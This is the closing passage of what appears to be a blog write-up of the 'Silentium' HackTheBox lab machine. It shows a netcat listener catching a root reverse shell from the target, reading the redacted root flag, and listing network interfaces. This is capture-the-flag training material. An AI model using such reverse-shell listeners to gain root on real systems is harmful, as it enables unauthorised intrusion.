+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4265" onclick="terminalOverlayClose('bash-bash-4265')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4265')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4265')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4265')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4265" data-language="bash">
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.245.103 34760
+bash: cannot set terminal process group (1476): Inappropriate ioctl for device
+bash: no job control in this shell
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2#
+</pre> </div> </div> <p><br> Get the root.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42235"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42235')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42235')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42235')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42235')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42235">
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cat /root/root.txt
+cat /root/root.txt
+&lt;redacted&gt;
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:95:a3:06 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.245.103/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2654sec preferred_lft 2654sec
+    inet6 dead:beef::250:56ff:fe95:a306/64 scope global dynamic mngtmpaddr 
+       valid_lft 86394sec preferred_lft 14394sec
+    inet6 fe80::250:56ff:fe95:a306/64 scope link 
+       valid_lft forever preferred_lft forever
+3: br-2141d27c70d6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether b2:f6:a1:e4:92:da brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2141d27c70d6
+       valid_lft forever preferred_lft forever
+    inet6 fe80::b0f6:a1ff:fee4:92da/64 scope link 
+       valid_lft forever preferred_lft forever
+4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 32:a0:63:ff:bc:2c brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+5: veth6f84bf3@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether 32:51:19:13:e5:31 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::3051:19ff:fe13:e531/64 scope link 
+       valid_lft forever preferred_lft forever
+6: veth79f6220@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether ae:d8:70:07:2b:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 1
+    inet6 fe80::acd8:70ff:fe07:2bc6/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42235" onclick="terminalOverlayClose('bash-bash-42235')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42235')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42235')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42235')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42235" data-language="bash">
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cat /root/root.txt
+cat /root/root.txt
+&lt;redacted&gt;
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:95:a3:06 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.245.103/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2654sec preferred_lft 2654sec
+    inet6 dead:beef::250:56ff:fe95:a306/64 scope global dynamic mngtmpaddr 
+       valid_lft 86394sec preferred_lft 14394sec
+    inet6 fe80::250:56ff:fe95:a306/64 scope link 
+       valid_lft forever preferred_lft forever
+3: br-2141d27c70d6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether b2:f6:a1:e4:92:da brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2141d27c70d6
+       valid_lft forever preferred_lft forever
+    inet6 fe80::b0f6:a1ff:fee4:92da/64 scope link 
+       valid_lft forever preferred_lft forever
+4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 32:a0:63:ff:bc:2c brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+5: veth6f84bf3@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether 32:51:19:13:e5:31 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::3051:19ff:fe13:e531/64 scope link 
+       valid_lft forever preferred_lft forever
+6: veth79f6220@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether ae:d8:70:07:2b:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 1
+    inet6 fe80::acd8:70ff:fe07:2bc6/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> </div> <p><br> And with that, we will be silent no more as we crack the Silentium box. Hope you enjoyed the read. See you in the next one!</p> <p><br></p> <h2>Trophy</h2> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/trophy.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Trophy" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
